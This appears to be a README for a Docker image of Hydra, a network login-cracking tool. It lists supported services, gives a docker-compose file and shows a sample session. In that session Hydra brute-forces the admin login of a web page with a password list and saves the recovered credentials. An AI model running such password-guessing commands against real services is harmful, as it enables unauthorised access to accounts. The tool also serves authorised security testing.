hydra
=====

A very fast network logon cracker which support many different services.

- [x] openssl
- [x] idn
- [x] curses
- [x] pcre
- [x] Postgres
- [x] SVN
- [ ] firebird
- [x] MYSQL client
- [ ] AFP
- [ ] NCP
- [ ] SAP/R3
- [x] libssh
- [ ] Oracle
- [ ] GUI req's
- [x] Android specialities
- [x] secure compile option support in gcc

## docker-compose.yml

```yaml
version: "3.8"
services:
  hydra:
    image: vimagick/hydra
    entrypoint: sleep
    command: infinity
    volumes:
      - ./data:/data
    working_dir: /data
    restart: unless-stopped
```

# up and running

```bash
$ docker-compose up -d

$ docker-compose exec hydra bash

>>> cat passwd.txt
    123456
    admin
    ...

>>> hydra -l admin -P passwd.txt -o hacked.txt http://www.target.com/login.php
    [DATA] max 1 task per 1 server, overall 64 tasks, 3 login try (l:1/p:1), ~0 tries per task
    [DATA] attacking service http-get on port 2812
    [2812][http-get] host: www.target.com   login: admin   password: admin
    1 of 1 target successfully completed, 1 valid password found

>>> cat hacked.txt
    [2812][http-get] host: www.target.com   login: admin   password: admin
```
